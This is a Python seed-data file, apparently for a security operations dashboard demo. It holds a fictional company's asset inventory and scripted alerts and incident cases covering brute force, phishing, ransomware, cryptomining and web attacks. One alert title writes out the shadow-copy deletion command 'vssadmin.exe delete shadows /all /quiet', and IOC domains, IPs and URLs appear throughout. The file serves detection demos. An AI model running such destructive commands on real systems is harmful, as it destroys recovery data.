...
ASSETS = [
    # ── 生产核心 VPC (10.0.x.x) ──
    (
        "prod-gateway-kong-01",
        "10.0.10.20",
        "li.qiang",
        "电商平台",
        "critical",
        "api,kong,prod,gateway,pci-dss",
        "对外核心 API 网关（Kong 3.6 / Linux 6.1），PCI-DSS 范围",
    ),
    (
        "prod-gateway-kong-02",
        "10.0.10.21",
        "li.qiang",
        "电商平台",
        "critical",
    ...
    (
        "prod-ingress-nginx-01",
        "10.0.10.15",
        "chen.hao",
        "应用路由",
        "critical",
        "ingress,nginx,k8s,prod",
        "K8s Ingress 外部流量接入与 TLS 终结代理",
    ),
    (
        "web-prod-01",
        "10.0.10.11",
        ...
        "电商平台",
        "critical",
        "web,nginx,prod,pci-dss",
        "官方商城前端，Nginx 1.24，PCI-DSS 范围内核心资产",
    ),
    (
        "web-prod-02",
        "10.0.10.12",
    ...
    (
        "prod-user-service-01",
        "10.0.15.10",
        "zhao.min",
        "用户中心",
        "critical",
        "microservice,java,spring-boot,prod",
        "用户认证与会员中心核心微服务（JDK 17 / Spring Boot 3.2）",
    ),
    (
        "prod-user-service-02",
        "10.0.15.11",
        "zhao.min",
        "用户中心",
        "critical",
    ...
    (
        "prod-payment-service-01",
        "10.0.15.20",
        "zhao.min",
        "支付结算",
        "critical",
        "microservice,golang,pci-dss,core-tier1",
        "核心支付交易与清结算引擎，PCI-DSS 最高防护等级",
    ),
    (
        "prod-payment-service-02",
        "10.0.15.21",
        "zhao.min",
        "支付结算",
        "critical",
    ...
    (
        ...
        "统一身份认证",
        "critical",
        "sso,oauth2,keycloak,prod",
        "企业与客户统一身份认证中心（Keycloak 24.0），集成 MFA 与 SAML",
    ),
    (
        "prod-kafka-broker-01",
        "10.0.25.11",
        "chen.hao",
        "消息中枢",
        "critical",
        "kafka,mq,prod,cluster",
        "Kafka 核心消息队列集群 Broker 01（承载订单与支付流水）",
    ),
    (
        "prod-kafka-broker-02",
        "10.0.25.12",
        "chen.hao",
        "消息中枢",
        "critical",
        "kafka,mq,prod,cluster",
        "Kafka 核心消息队列集群 Broker 02",
    ),
    (
        "prod-kafka-broker-03",
        "10.0.25.13",
        "chen.hao",
        "消息中枢",
        "critical",
        "kafka,mq,prod,cluster",
        "Kafka 核心消息队列集群 Broker 03",
    ),
    (
        "prod-rabbitmq-cluster-01",
        "10.0.25.20",
        "chen.hao",
        "任务调度",
        "high",
        "rabbitmq,mq,prod",
        "交易异步回调与延迟重试队列 RabbitMQ 3.12",
    ),
    (
        "prod-pg-master-01",
        "10.0.20.20",
        ...
        "支付数据库",
        "critical",
        "database,postgresql,patroni,prod,pci-dss",
        "PostgreSQL 16 支付主库（Patroni HA + 物理流复制）",
    ),
    (
        "prod-pg-replica-01",
        "10.0.20.21",
        ...
        "支付数据库",
        "critical",
        "database,postgresql,replica,prod",
        "PostgreSQL 16 支付从库（只读查询与容灾备份）",
    ),
    (
        "db-mysql-prod",
        "10.0.20.10",
        ...
        "订单数据库",
        "critical",
        "database,mysql,mha,prod",
        "MySQL 8.0 主库，承载全站订单与资金往来流水",
    ),
    (
        "prod-mysql-order-02",
        "10.0.20.11",
        ...
        "订单数据库",
        "critical",
        "database,mysql,replica,prod",
        "MySQL 8.0 订单从库，承载数据统计与对账导出",
    ),
    (
        "db-redis-cache",
        "10.0.20.15",
        ...
        "电商平台",
        "high",
        "cache,redis,sentinel,prod",
        "Redis 7.2 会话状态与分布式锁 Master 节点",
    ),
    (
        "prod-redis-sentinel-02",
        "10.0.20.16",
        "zhao.min",
        "电商平台",
        "high",
        "cache,redis,sentinel,prod",
        "Redis 7.2 会话状态与热点缓存 Slave 节点",
    ),
    (
        "prod-mongo-analytics-01",
        "10.0.20.30",
        "zhao.min",
        "数据分析",
        "medium",
        "database,mongodb,prod",
        "MongoDB 7.0 用户行为、搜索历史与前端埋点存储",
    ),
    (
        "prod-minio-oss-01",
        "10.0.40.10",
        ...
        "对象存储",
        "high",
        "storage,minio,s3,prod",
        "MinIO 分布式对象存储集群（存储商品大图与电子单据）",
    ),
    (
        "prod-es-master-01",
        "10.0.45.10",
        ...
        "Elasticsearch 8.12 生产搜索与商品全文检索引擎",
    ),
    (
        "prod-es-data-01",
        "10.0.45.11",
        ...
        "搜索与日志",
        "high",
        "elasticsearch,data-node,prod",
        "Elasticsearch 数据节点 01（承载商品倒排索引与热点日志）",
    ),
    (
        "k8s-node-01",
        "10.0.30.11",
        ...
        "容器平台",
        "high",
        "kubernetes,worker,prod",
        "K8s 生产工作节点 01（承载电商核心微服务 Pod）",
    ),
    (
        "k8s-node-02",
        "10.0.30.12",
    ...
    (
        ...
        "AI算力平台",
        "high",
        "kubernetes,gpu,nvidia,prod",
        "AI 风险控制与大模型实时推理节点（NVIDIA A100 80GB）",
    ),
    (
        "backup-nas-01",
        "10.0.40.5",
        ...
        "备份系统",
        "high",
        "backup,nas,veeam,offline",
        "异地容灾冷备 NAS，Veeam 存储库，配置 WORM 不可变快照",
    ),
    ...
    (
        ...
        "代码托管",
        "critical",
        "git,gitlab,devops,core-repo",
        "GitLab CE 16.8 核心代码仓库，存放全公司核心代码与密钥配置",
    ),
    (
        "dev-jenkins-01",
        "10.50.10.10",
        ...
        "medium",
        "ci,jenkins,devops",
        "Jenkins CI 构建中枢，暴露 8080 端口于研发网段",
    ),
    (
        ...
        "研发效能",
        "medium",
        "ci,jenkins-agent,build",
        "Jenkins 动态构建 Runner 节点，执行自动化单元测试与镜像打包",
    ),
    (
        "dev-harbor-registry",
        "10.50.10.20",
        ...
        "Harbor 2.10 企业私有容器镜像仓库（集成 Trivy 漏洞门禁）",
    ),
    (
        "dev-sonarqube-server",
        "10.50.10.30",
        "chen.hao",
        "代码质量",
        "medium",
        "sonarqube,sast,quality",
        "SonarQube 代码静态安全扫描与 OWASP Top 10 合规检查",
    ),
    (
        "k8s-node-03",
        "10.0.30.13",
        ...
        "K8s 预发测试集群工作节点（开发测试隔离域）",
    ),
    # ── DMZ 边界与网络安全层 (172.16.x.x) ──
    (
        "dmz-waf-cloudflare-edge",
        "172.16.0.2",
        "admin",
        "边缘防护",
        "critical",
        "waf,ddos,cloudflare,edge",
        "Cloudflare 企业级边缘防护与全球 Anycast DDoS 流量清洗",
    ),
    (
        "dmz-waf-nginx-01",
        "172.16.0.3",
        ...
        "应用WAF",
        "critical",
        "waf,modsecurity,nginx,dmz",
        "ModSecurity + OWASP Core Rule Set 反向代理 WAF 节点",
    ),
    (
        "jump-bastion-01",
        "172.16.0.5",
        ...
        "critical",
        "bastion,ssh,dmz,mfa",
        "JumpServer 运维堡垒机，唯一 SSH 入口，启用 Google Authenticator MFA",
    ),
    (
        "dmz-bastion-02",
        "172.16.0.6",
        ...
        "critical",
        "bastion,ssh,dmz,mfa",
        "JumpServer 堡垒机热备节点，承载只读审计与录屏回放",
    ),
    (
        "vpn-gw-01",
        "172.16.0.10",
        ...
        "远程接入",
        "critical",
        "vpn,fortigate,ssl-vpn,dmz",
        "FortiGate 600E SSL-VPN 远程办公网关，接入全员双因子认证",
    ),
    (
        "dmz-mail-relay-01",
        "172.16.0.25",
        ...
        "邮件网关",
        "high",
        "mail,postfix,spam-filter,dmz",
        "Postfix 邮件边界中继网关，内置 SPF/DKIM/DMARC 校验与反垃圾",
    ),
    ...
    (
        ...
        "办公网-AD",
        "critical",
        "domain-controller,windows,activedirectory",
        "Windows Server 2022 主域控（corp.acme-corp.cn），承载全员目录权限",
    ),
    (
        "dc-dc02",
        "10.0.1.11",
        ...
        "critical",
        "domain-controller,windows,activedirectory",
        "Windows Server 2022 辅助域控，与主域控双向实时同步",
    ),
    (
        "filesrv-01",
        "10.0.1.20",
        ...
        "文件共享",
        "critical",
        "fileserver,windows,smb,finance-share",
        "部门文件服务器（SMB 3.0），存放财务、法务与高管核心共享目录",
    ),
    (
        "mail-exch-01",
        "10.0.1.30",
        ...
        "邮件系统",
        "high",
        "mail,exchange,windows",
        "Exchange Server 2019 内部邮件系统",
    ),
    (
        "sec-wazuh-manager-01",
        "10.100.1.10",
        "admin",
        "安全运营",
        "critical",
        "siem,wazuh,manager,sec-ops",
        "Wazuh 4.8 HIDS 主机安全管理中枢与实时规则关联引擎",
    ),
    (
        "sec-suricata-ids-01",
        "10.100.1.20",
        ...
        "网络安全",
        "high",
        "ids,suricata,nids,sensor",
        "Suricata 7.0 骨干网络旁路 NIDS 探针，全天候捕获异常入侵流量",
    ),
    (
        "sec-zeek-sensor-01",
        "10.100.1.25",
        ...
        "网络分析",
        "high",
        "nsm,zeek,traffic-analysis",
        "Zeek 6.2 流量安全元数据分析传感器，提取 TLS/DNS/HTTP 会话指纹",
    ),
    ...
    (
        ...
        "财务系统",
        "high",
        "endpoint,windows,finance,confidential",
        "财务部资金主管 Windows 11 专机（已部署 EDR 实时防护与 DLP 策略）",
    ),
    (
        "fin-ws-chen",
        "192.168.20.18",
        ...
        "财务系统",
        "high",
        "endpoint,windows,finance",
        "财务出纳专用台式机，承载网上银行 USB Key 与对账客户端",
    ),
    (
        "it-laptop-zhang",
        "192.168.10.21",
        ...
        "IT 运维",
        "medium",
        "endpoint,macos,ops,privileged",
        "IT 基础架构与运维专家 MacBook Pro 终端，具备堡垒机管理权限",
    ),
    (
        "ops-win-li",
        "192.168.10.22",
        ...
        "SRE团队",
        "high",
        "endpoint,windows,sre",
        "SRE 运维主管工作机，具备生产网络跳板访问权限",
    ),
    (
        "dev-mbp-wang",
        "192.168.10.35",
        ...
        "核心研发",
        "medium",
        "endpoint,macos,developer",
        "电商架构师 MacBook Pro，具备 GitLab Maintainer 与 K8s 调试权限",
    ),
    (
        "hr-laptop-wang",
        "192.168.20.22",
        ...
        "medium",
        "endpoint,windows,hr",
        "HR 薪酬专员 Windows 11 终端，具备员工档案与薪资表查阅权限",
    ),
    (
        "iot-conf-board-01",
        "192.168.50.12",
        ...
        "智能办公",
        "low",
        "iot,android,conference",
        "总部 8 楼大会议室 MAXHUB 智能会议大屏终端（Android 12）",
    ),
    (
        "iot-door-controller-01",
        "192.168.50.20",
        "admin",
        "安防门禁",
        "medium",
        "iot,embedded,door-access",
        "机房与财务办公区人脸识别智能门禁控制器",
    ),
    # ── 公有云原生对象 ──
    (
        "aws-s3-finance-exports",
        "172.31.0.1",
        "admin",
        "云上存储",
        "critical",
        "cloud,aws,s3,finance-data",
        "AWS S3 企业财务报表归档与月结数据导出桶（us-east-1）",
    ),
    (
        "aws-rds-aurora-prod",
        "172.31.10.5",
        ...
        "云上数据库",
        "critical",
        "cloud,aws,rds,aurora,postgresql",
        "AWS Aurora Serverless v2 多可用区核心分析数据库实例",
    ),
]
...
ALERT_SPECS: list[dict] = [
    ...
    },
    {
        ...
        "event_type": "brute_force",
        "severity": "medium",
        "title": "SSHD: Brute force login attempt (41 failed attempts)",
        ...
        "threat_score": 40,
        "agg": 41,
        "tags": ["brute-force", "ssh", "password-spraying"],
        "resolution": "确认为内部安全团队的红队授权渗透测试流量。",
        "root_cause": "红队演练（变更单 CHG-2026-0912）",
    ...
    },
    {
        ...
        "event_type": "brute_force",
        "severity": "medium",
        "title": "SSHD: Brute force login attempt (88 failed attempts)",
        "description": "222.186.18.35 对堡垒机 22 端口发起高强度爆破，fail2ban 触发 3 次封禁。",
        "src_ip": "222.186.18.35",
        "dst_ip": "172.16.0.5",
        "protocol": "TCP",
        "agent": "jump-bastion-01",
        "rule_id": "5712",
        ...
        "agg": 88,
        "tags": ["brute-force", "ssh"],
        "resolution": "IP 已列入永久封禁名单，未发现成功登入。",
        "classification": "true_positive",
    },
    {
        "key": "bf-04",
        ...
        "event_type": "brute_force",
        "severity": "medium",
        "title": "SSHD: Brute force login attempt (27 failed attempts)",
        ...
        "threat_score": 48,
        "agg": 27,
        "tags": ["brute-force", "ssh", "low-and-slow"],
        "resolution": "切换为密钥认证策略后攻击面收敛，攻击源已封禁。",
        "classification": "true_positive",
    },
    {
        "key": "bf-05",
        ...
        "event_type": "brute_force",
        "severity": "medium",
        "title": "SSHD: Brute force login attempt (52 failed attempts)",
        "description": "5.188.206.130 爆破 VPN 网关 SSH 管理接口，FortiGate 日志同步记录来源。",
        "src_ip": "5.188.206.130",
        "dst_ip": "172.16.0.10",
        "protocol": "TCP",
        "agent": "vpn-gw-01",
        "rule_id": "5712",
        ...
        "mitre": "Credential Access",
        "techniques": ["T1110.001"],
        "location": "/var/log/fortigate/traffic.log",
        "status": "resolved",
        "mttr_h": 0.9,
        "threat_score": 50,
        "agg": 52,
        "tags": ["brute-force", "ssh", "vpn"],
        "resolution": "管理接口已限制为白名单访问，来源 IP 封禁。",
        "classification": "true_positive",
    },
    {
        "key": "bf-06",
        ...
        "event_type": "brute_force",
        "severity": "medium",
        "title": "SSHD: Brute force login attempt (34 failed attempts)",
    ...
    },
    {
        ...
        "event_type": "brute_force",
        "severity": "medium",
        "title": "SSHD: Brute force login attempt (17 failed attempts)",
        "description": "103.4.217.168 对堡垒机的持续性爆破仍在进行，与近 24h 多源爆破可能为同一僵尸网络。",
        "src_ip": "103.4.217.168",
        "dst_ip": "172.16.0.5",
        "protocol": "TCP",
        "agent": "jump-bastion-01",
        "rule_id": "5712",
    ...
    },
    {
        ...
        "severity": "critical",
        "title": "SSHD: Authentication succeeded after 27 failed attempts",
        ...
        "location": "/var/log/auth.log",
        "status": "escalated",
        "escalated_to": "security-lead",
        "esc_reason": "多次失败后成功登入，疑似凭据泄露，需立即排查账户 deploy 的操作轨迹",
        "threat_score": 92,
        "agg": 1,
        "tags": ["brute-force", "ssh", "success-after-failures", "p1"],
    },
    # ── 支线 B：钓鱼邮件 → 凭据窃取 → 云控制台滥用（调查中）─────────
    {
        ...
        "event_type": "phishing",
        "severity": "high",
        "title": "Credential harvesting email delivered to Finance group (12 recipients)",
        "description": "主题为【发票异常-请核对付款账户】的钓鱼邮件绕过 EOP 投递至财务组 12 名用户，内嵌仿冒 SSO 登录页链接。",
        "agent": "mail-exch-01",
        "mitre": "Initial Access",
        "techniques": ["T1566.002"],
        "iocs": [
            {"type": "email", "value": "billing@invoice-notify.net", "confidence": 95},
            {
                "type": "domain",
                "value": "mail-verify-secure-login.com",
                "confidence": 92,
            },
            {
                "type": "url",
                "value": "http://mail-verify-secure-login.com/sso/auth.html",
                "confidence": 92,
            },
        ],
        "full_log": '{"MessageTraceId":"a1b2c3d4","Subject":"发票异常-请核对付款账户","SenderIP":"43.155.132.88","Recipients":12,"Action":"Delivered"}',
        "location": "O365 Message Trace",
    ...
    },
    {
        ...
        "event_type": "phishing",
        "severity": "high",
        "title": "User clicked phishing link, browser redirected to harvest page",
        "description": "fin-laptop-liu（liu.yiming）访问钓鱼域名并提交了 POST 表单，高度怀疑凭据已泄露。",
        "src_ip": "192.168.20.15",
        "dst_ip": "43.155.132.88",
        "protocol": "HTTPS",
        ...
        "location": "/var/log/zeek/http.log",
        "status": "investigating",
        "threat_score": 88,
        "tags": ["phishing", "credential-harvesting", "finance"],
    },
    {
        "key": "ident-impossible-01",
        "h": 50,
        "source": "azure_ad",
        "event_type": "account_anomaly",
        "severity": "high",
        "title": "Impossible travel: liu.yiming signed in from Singapore 6 min after China login",
        ...
        "status": "investigating",
        "threat_score": 85,
        "tags": ["impossible-travel", "account-takeover", "mfa-fatigue"],
    },
    {
        "key": "cloud-iam-key-01",
        "h": 49,
        "source": "cloudtrail",
        "event_type": "cloud_audit",
        "severity": "critical",
        "title": "New IAM access key created for finance-readonly by liu.yiming",
        ...
        "location": "CloudTrail us-east-1",
        "status": "escalated",
        "escalated_to": "security-lead",
        "esc_reason": "云上持久化 attempt，需立即禁用密钥并回滚",
        "threat_score": 94,
        "tags": ["cloud", "persistence", "iam"],
    },
    {
        "key": "cloud-s3-public-01",
        "h": 47,
        "source": "cloudtrail",
        "event_type": "cloud_audit",
        "severity": "critical",
        "title": "S3 bucket policy changed to public-read on finance-exports",
    ...
    # ── 支线 C：勒索软件部署链（P1 应急中，SLA 已超期）──────────────
    {
        ...
        "iocs": [
            {"type": "ip", "value": "209.141.35.17", "confidence": 96},
    ...
    },
    {
        ...
        "severity": "critical",
        "title": "Suspected LSASS memory access (Mimikatz pattern) on dc-dc01",
        ...
        "iocs": [
            {
                "type": "sha256",
                "value": sha("mimikatz-sample-dc-dc01"),
                "confidence": 91,
            }
        ],
        ...
        "location": "WinEventLog // Microsoft-Windows-Sysmon/Operational",
        "status": "investigating",
        "threat_score": 95,
        "tags": ["mimikatz", "credential-dumping", "p1"],
    },
    {
        "key": "newadmin-01",
        "h": 23,
        ...
        "severity": "high",
        "title": "New account 'svc_backup$' added to built-in Administrators group",
        ...
        "status": "investigating",
        "threat_score": 88,
        "tags": ["persistence", "rogue-admin", "p1"],
    },
    {
        "key": "psexec-01",
        "h": 22,
        ...
        "severity": "critical",
        "title": "PsExec service installed on filesrv-01 from it-laptop-zhang",
        ...
        "iocs": [
            {"type": "sha256", "value": sha("encrypt_helper-binary"), "confidence": 89}
        ],
        ...
        "location": "WinEventLog // System",
        "status": "investigating",
        "threat_score": 93,
        "tags": ["lateral-movement", "psexec", "p1"],
    },
    {
        "key": "vssdel-01",
        "h": 21,
        ...
        "severity": "critical",
        "title": "vssadmin.exe delete shadows /all /quiet executed on filesrv-01",
        ...
        "location": "WinEventLog // Security (Sysmon EID 1)",
        "status": "investigating",
        "threat_score": 96,
        "tags": ["ransomware", "shadow-copy-deletion", "p1"],
    },
    {
        "key": "ransom-fim-01",
        "h": 20,
        ...
        "severity": "critical",
        "title": "FIM: 3,214 files modified with .locked extension within 5 minutes",
        ...
        "iocs": [
            {
                "type": "sha256",
                "value": sha("ransomware-lockbit-variant-sample"),
                "confidence": 94,
        ...
        "location": "/var/osquery/results.log",
        "status": "investigating",
        "threat_score": 99,
        "agg": 1,
        "tags": ["ransomware", "file-encryption", "p1"],
    },
    # ── 支线 D：K8s 挖矿木马（已结案）────────────────────────────
    {
        "key": "miner-pool-01",
        ...
        "severity": "high",
        "title": "ET MALWARE XMRig Crypto Miner Pool Connection (pool.supportxmr.top)",
        ...
        "techniques": ["T1496"],
        "iocs": [
            {"type": "domain", "value": "pool.supportxmr.top", "confidence": 85},
    ...
    },
    {
        ...
        "severity": "medium",
        "title": "Suspicious process 'kdevtmpfsi' consuming 94% CPU on k8s-node-03",
        ...
        "threat_score": 68,
        "tags": ["crypto-mining"],
        "resolution": "与 miner-pool-01 同一事件，容器已清理。",
        "classification": "true_positive",
    },
    {
        "key": "miner-cron-01",
        ...
        "severity": "medium",
        "title": "Suspicious crontab modification /etc/cron.d/root on dev-jenkins-01",
        "description": "dev-jenkins-01 新增 cron 任务定期从 update-cdn-service-cdn.xyz 下载并执行脚本，为挖矿持久化。",
        "dst_ip": "10.0.50.10",
        "agent": "dev-jenkins-01",
        "rule_id": "530",
        "rule_level": 8,
        ...
        "mttr_h": 6.2,
        "threat_score": 70,
        "tags": ["persistence", "cron", "crypto-mining"],
        "resolution": "删除恶意 cron 与下载脚本，重置 root 凭据。",
        "classification": "true_positive",
    },
    # ── 支线 E：Web 应用攻击（已结案）────────────────────────────
    {
        ...
        "severity": "medium",
        "title": "SQL injection pattern blocked: UNION SELECT in /api/v1/products",
        ...
        "mttr_h": 0.3,
        "threat_score": 35,
        "tags": ["sqli", "waf", "automated-scanner"],
        "resolution": "自动化扫描器流量，WAF 正常拦截，无实际影响。",
        "classification": "false_positive",
    },
    {
        "key": "sqli-02",
        ...
        "event_type": "web_attack",
        "severity": "medium",
        "title": "Time-based blind SQLi attempt (sleep payload) in /api/v1/orders",
    ...
    },
    {
        ...
        "event_type": "web_attack",
        "severity": "medium",
        "title": "sqlmap User-Agent detected against /api/v1/login",
    ...
    },
    {
        ...
        "event_type": "web_attack",
        "severity": "critical",
        "title": "Log4Shell (CVE-2021-44228) JNDI lookup attempt against web-prod-02",
        ...
        "mttr_h": 3.5,
        "threat_score": 85,
        "tags": ["log4shell", "rce", "cve-2021-44228"],
        "resolution": "WAF 拦截成功；dev-jenkins-01 关联组件当日升级 log4j 2.17.1 并全网复扫确认无残留。",
        "root_cause": "外部扫描器批量利用尝试",
        "remediation": "升级受影响组件；保持 WAF Log4j 虚拟补丁开启",
        "classification": "true_positive",
    },
    {
        "key": "nmap-web-01",
        ...
        "severity": "low",
        "title": "ET SCAN Possible Nmap User-Agent Observed against web tier",
    ...
    # ── 支线 F：数据外发与 DNS 隧道（处理中）────────────────────
    {
        ...
        "severity": "high",
        "title": "Large outbound upload (2.3GB) to personal cloud storage from hr-laptop-wang",
        "description": "hr-laptop-wang（wang.xiaotong）在非工作时段向个人网盘 weshare-api.top 上传 2.3GB 数据，DLP 命中『员工个人信息』策略。",
        "src_ip": "192.168.20.22",
        "dst_ip": "43.155.132.88",
        "protocol": "HTTPS",
        ...
        "status": "new",
        "threat_score": 83,
        "tags": ["dlp", "data-exfiltration", "insider-risk"],
    },
    {
        "key": "dns-tunnel-01",
        "h": 3,
        ...
        "severity": "high",
        "title": "High-entropy DNS TXT queries to 0xcd10e1.tech — suspected DNS tunneling",
    ...
    # ── 漏洞暴露面（Trivy 定时扫描）────────────────────────────
    {
        "key": "vuln-regression-01",
        "h": 30,
        "source": "trivy",
        "event_type": "vulnerability",
        "severity": "high",
        "title": "CVE-2024-6387 (regreSSHion) detected on jump-bastion-01",
    ...
    },
    {
        ...
        "event_type": "vulnerability",
        "severity": "critical",
        "title": "CVE-2023-4966 (Citrix Bleed) detected on vpn-gw-01",
        ...
        "status": "new",
        "threat_score": 90,
        "tags": ["vulnerability", "citrix", "zero-day-adjacent"],
    },
    {
        "key": "vuln-runc-01",
        "h": 55,
        ...
        "event_type": "vulnerability",
        "severity": "medium",
        "title": "CVE-2024-21626 (runc) detected on k8s-node-01/02",
        ...
        "status": "investigating",
        "threat_score": 66,
        "tags": ["vulnerability", "kubernetes"],
    },
    {
        "key": "vuln-rapid-reset-01",
        "h": 80,
        "source": "trivy",
        "event_type": "vulnerability",
        "severity": "medium",
        "title": "CVE-2023-44487 (HTTP/2 Rapid Reset) exposure on api-gateway-01",
        "description": "Kong 网关前端 Nginx 启用 HTTP/2，存在 Rapid Reset DDoS 风险（CVSS 7.5），已通过 upstream 限流缓解。",
        "dst_ip": "10.0.10.20",
        "agent": "api-gateway-01",
        "rule_id": "trivy-cve",
        "rule_level": 5,
        ...
        "mttr_h": 4.0,
        "threat_score": 60,
        "tags": ["vulnerability", "ddos"],
        "resolution": "已启用 HTTP/2 并发流限制与 WAF 速率规则。",
        "remediation": "Nginx keepalive_requests 限额 + WAF flood 规则",
        "classification": "true_positive",
    },
    {
        "key": "vuln-log4j-01",
        ...
        "event_type": "vulnerability",
        "severity": "critical",
        "title": "CVE-2021-44228 (Log4Shell) detected on dev-jenkins-01",
        ...
        "remediation": "CI 流水线加入 Trivy 镜像门禁",
        "classification": "true_positive",
    },
    # ── 终端与身份杂项 ────────────────────────────────────────
    {
        "key": "edr-quarantine-01",
        "h": 90,
        "source": "osquery",
        "event_type": "malware",
        "severity": "info",
        "title": "EDR: Trojan:JS/FakeUpdate quarantined on hr-laptop-wang",
        "description": "用户下载仿冒 Chrome 更新程序，EDR 实时防护自动隔离，无需人工处理。",
        "dst_ip": "192.168.20.22",
        "agent": "hr-laptop-wang",
        "rule_id": "edr-1191",
        "rule_level": 4,
        ...
        "mttr_h": 0.1,
        "threat_score": 20,
        "tags": ["malware", "auto-remediated"],
        "resolution": "EDR 自动隔离，样本已上传沙箱分析。",
        "classification": "true_positive",
    },
    {
        "key": "usb-dlp-01",
        ...
        "severity": "low",
        "title": "USB storage device attached to fin-laptop-liu",
        "description": "财务终端接入未知 USB 存储设备（SanDisk Cruzer Blade），DLP 策略记录外拷行为。",
        "dst_ip": "192.168.20.15",
        "agent": "fin-laptop-liu",
        "rule_id": "osq-usb-4",
        "rule_level": 4,
    ...
    },
    {
        ...
        "event_type": "brute_force",
        "severity": "medium",
        "title": "Windows logon failure spike (4625 x 34) on dc-dc01",
        ...
        "status": "investigating",
        "threat_score": 72,
        "tags": ["password-spraying", "insider-suspect"],
    },
    {
        "key": "mail-rule-01",
        "h": 33,
        "source": "office365",
        "event_type": "email_rule",
        "severity": "medium",
        "title": "Suspicious inbox rule created: auto-forward to external address",
        "description": "hr 部账户 wang.xiaotong@acme-corp.cn 新建收件箱规则，将含『工资|薪资|offer』关键字的邮件自动转发至外部邮箱。",
        "agent": "mail-exch-01",
        "mitre": "Collection",
        "techniques": ["T1114.003"],
        "iocs": [
            {"type": "email", "value": "hr.data.2026@weshare-api.top", "confidence": 80}
        ],
        ...
        "location": "O365 Audit Log (New-InboxRule)",
        "status": "new",
        "threat_score": 76,
        "tags": ["persistence", "email-forwarding", "insider-risk"],
    },
    {
        "key": "audit-policy-01",
        "h": 130,
        ...
        "severity": "info",
        "title": "Audit policy changed on dc-dc02",
        ...
        "mttr_h": 1.0,
        "threat_score": 10,
        "tags": ["audit", "change-verified"],
        "resolution": "与变更管理记录匹配，正常加固。",
        "classification": "false_positive",
    },
    {
        "key": "root-login-01",
        ...
        "event_type": "cloud_audit",
        "severity": "info",
        "title": "Root account console login (MFA) from known corporate IP",
        ...
        "mttr_h": 0.2,
        "threat_score": 15,
        "tags": ["cloud", "root-account"],
        "resolution": "与运维值班记录匹配。",
        "classification": "false_positive",
    },
]
...
def build_story_alerts() -> list[SecurityAlert]:
    ...
    for spec in ALERT_SPECS:
        ...
        mitre_tactics = [
            t.strip() for t in spec.get("mitre", "").split(",") if t.strip()
        ]
        status = spec["status"]
        alert = SecurityAlert(
            source=spec["source"],
            ...
            agent_id=(
                uid("agent", spec.get("agent", "unknown"))[:12]
                if spec.get("agent")
                else None
            ),
            ...
            assigned_to=(
                "admin"
                if status in ("investigating", "resolved", "escalated")
                else None
            ),
            assigned_at=(
            ...
            resolved_at=(
                ago(hours=spec["h"] - spec["mttr_h"]) if spec.get("mttr_h") else None
            ),
            resolved_by="admin" if spec.get("mttr_h") else None,
            escalated_to=spec.get("escalated_to"),
            escalated_at=(
                created + timedelta(minutes=30) if spec.get("escalated_to") else None
            ),
            ...
            fingerprint=sha(
                f"{spec['source']}|{spec['event_type']}|{spec.get('src_ip')}"
            ),
            aggregated_count=spec.get("agg", 1),
            last_seen_at=(
                created + timedelta(minutes=6) if spec.get("agg", 1) > 1 else created
            ),
...
def build_noise_alerts() -> list[SecurityAlert]:
    ...
    for i in range(45):
        ...
        alerts.append(
            SecurityAlert(
                source="suricata",
                external_event_id=f"DEMO-NOISE-SCAN-{i:03d}",
                event_type="reconnaissance",
                severity="low",
                ...
                classification="false_positive",
                tags=["scan", "noise"],
                aggregated_count=5 + i % 12,
                last_seen_at=created + timedelta(minutes=8),
                is_aggregated=1,
                fingerprint=sha(f"scan|{src}"),
                created_at=created,
                updated_at=created,
                event_timestamp=created,
            )
    ...
    for i in range(35):
        ...
        alerts.append(
            SecurityAlert(
                source="wazuh",
                external_event_id=f"DEMO-NOISE-AUTH-{i:03d}",
                event_type="brute_force",
                severity="low",
                ...
                classification="false_positive",
                tags=["ssh", "noise"],
                aggregated_count=8 + i % 20,
                last_seen_at=created + timedelta(minutes=4),
                is_aggregated=1,
                fingerprint=sha(f"auth|{src}"),
                created_at=created,
                updated_at=created,
                event_timestamp=created,
            )
    ...
    for i in range(25):
        ...
        alerts.append(
            SecurityAlert(
                source="osquery",
                external_event_id=f"DEMO-NOISE-EDR-{i:03d}",
                event_type="malware",
                severity="info",
                title="EDR: Potentially unwanted program (PUA) blocked in real-time",
                description="员工下载软件捆绑的流氓广告插件/推广安装包，已被终端安全 Agent 秒级拦截并移入隔离区。",
                destination_ip="192.168.20.22",
                agent_name=target_agent,
                rule_id="edr-pua",
                rule_level=3,
                rule_groups="malware,quarantined",
                status="resolved",
                resolution_note="EDR 引擎自动查杀并清除临时文件。",
                resolved_by="admin",
                resolved_at=created + timedelta(minutes=1),
                threat_score=5,
                classification="true_positive",
                tags=["edr", "noise"],
                created_at=created,
    ...
    for i in range(30):
        ...
        alerts.append(
            SecurityAlert(
                source="modsecurity",
                external_event_id=f"DEMO-NOISE-API-{i:03d}",
                event_type="web_attack",
                severity="low",
                ...
                protocol="HTTP",
                agent_name=api_agents[i % len(api_agents)],
                rule_id="kong-rate-limit",
                rule_level=4,
                rule_groups="waf,api,rate_limit",
                mitre_tactics="Discovery",
                mitre_techniques=["T1087"],
                geoip=geoip(src),
                location="/var/log/kong/access.log",
                status="resolved",
                resolution_note="Kong 限流插件自动返回 429 并临时封禁客户端 IP。",
                resolved_by="admin",
...
CASES: list[dict] = [
    {
        ...
        "comments": [
            (
                "admin",
                25,
                "已将 filesrv-01 与 it-laptop-zhang 网络隔离（交换机端口 shutdown），C2 IP 209.141.35.17 已全网封禁。",
            ),
            (
                "admin",
                22,
                "备份核查：backup-nas-01 快照完好（最后快照 22:00），勒索样本未触及备份网段。已通知暂停全部 SMB 写入。",
            ),
            (
                "wang.fang",
                20,
                "财务共享目录受影响清单已导出：3,214 个文件 / 41 个部门目录。已要求全员暂停使用共享盘，改用临时协作空间。",
            ),
        ],
    },
    {
        "key": "bastion-compromise",
        "title": "堡垒机凭据失窃与异常登录横向侦察事件",
        ...
        "timeline": [
            (
                "status_change",
                "检测到暴力破解后成功登录，自动提升事件等级为 P1 Critical",
                "bf-success-01",
            ),
            ("assignment", "分配给值班安全专家 admin 紧急介入排查", None),
            (
                "status_change",
                "EDR 监测到 deploy 进程下发内网扫描脚本，已下发指令冻结进程并强制注销会话",
                None,
            ),
        ],
        "comments": [
            (
                "admin",
                17,
                "已强制终止会话并禁用 deploy 账号密码登录；正在排查该 IP 登录期间执行的所有历史命令审计日志。",
            ),
            (
                "admin",
                15,
